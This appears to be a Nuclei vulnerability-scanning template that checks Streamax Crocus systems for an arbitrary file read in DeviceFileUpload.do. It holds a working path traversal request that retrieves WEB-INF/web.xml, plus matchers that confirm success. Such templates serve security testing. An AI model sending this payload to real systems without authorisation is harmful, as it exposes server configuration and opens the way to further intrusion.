id: streamax-DeviceFileUpload-fileread
info:
  name: 锐明技术Crocus系统 DeviceFileUpload.do 任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://vip.bdziyi.com/60328/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: streamax,fileread

http:
  - raw:
      - |
        GET /DeviceFileUpload.do?Action=Download&&path=/../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1797.105 Safari/537.36
          
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml version','servlet')
        condition: and